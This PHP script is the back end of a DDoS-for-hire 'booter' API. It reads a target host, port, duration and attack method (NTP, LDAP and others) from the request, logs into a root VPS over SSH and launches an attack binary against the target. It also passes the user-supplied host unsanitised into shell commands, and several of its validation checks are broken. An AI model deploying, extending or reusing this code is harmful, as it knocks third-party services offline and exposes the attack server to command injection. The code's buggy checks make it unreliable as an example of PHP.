<?php
// http://34533535/api.php?key=kovachprik0l&host=[target]&port=[port]&time=[time]&method=[method] <--- EXAMPLE API REQUEST
ignore_user_abort(true);
set_time_limit(86400);
$server_ip = "";  // IP SERVER
$server_pass = "";  // PASS
$server_user = "";  // USER (ROOT)
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$array = array("attack","NTP","LDAP","stop"); // METHOD, EXAPLE: "HELL", "STOP" | DONT DELETE STOP!
$ray = array("key"); //ITS KEY FOR UR API
if (!empty($time)){
if (!empty($host)){
if (!empty($method)){
if ($method == "stop") { $command = "pkill $host -f"; } //FOR STOP ATTACK DONT DELETE
}
}	
}
if (!empty($key)){
}else{
die('Error: Write API key');}
if (in_array($key, $ray)){
}else{
die('Not correct API key');}
if (!empty($time)){
}else{
die('ERROR write time attack');}
if (!empty($host)){
}else{
die('ERROR write host');}
if (!empty($method)){
}else{
die('ERROR write method');}
if (in_array($method, $array)){
}else{
die('ERROR method not found');}
if ($port > 65535){
die('Error: port no more than 65535 does not exist!');}	
if ($time > 86400){
die('Error: the attack can not be more than 86400 seconds!');}  
if(ctype_digit($Time)){
die('Error: time is not in numbers!');}
if(ctype_digit($Port)){
die('Error: port is not in numbers!');}
//UR COMMAND FOR START ATTACK
if ($method == "HELL") { $command = "cd /home/ && ./hell $host $port 2 -1 $time"; } // COMMAND FOR START ATTACK  | DONT CHANGE


if (!function_exists("ssh2_connect")) die("Error: SSH2 dont install!");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "VPS dont work";
} else {
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
	echo "Login or password is incorrect";
    } else {
	
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {    
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
			echo "Started!</br>Target: $host</br>Port: $port </br>Time: $time</br>Method: $method";
            fclose($stream);
        }
    }
}
?>